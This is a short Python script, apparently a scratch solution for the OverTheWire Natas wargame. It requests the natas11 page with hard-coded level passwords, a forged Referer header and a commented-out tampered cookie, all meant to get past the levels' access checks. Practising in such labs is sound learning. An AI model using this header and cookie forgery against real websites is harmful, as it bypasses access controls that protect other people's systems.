import requests

headers = {
    'Authorization': 'Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va',
    'Referer': 'http://natas5.natas.labs.overthewire.org/',
}

# Headers = {'Cookie': 'data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}

login = {
    'user': 'natas11',
    'passs' : 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'
}

response = requests.get('http://natas11.natas.labs.overthewire.org/index.php',auth=(login['user'], login['passs']), headers=headers)

print(response.content)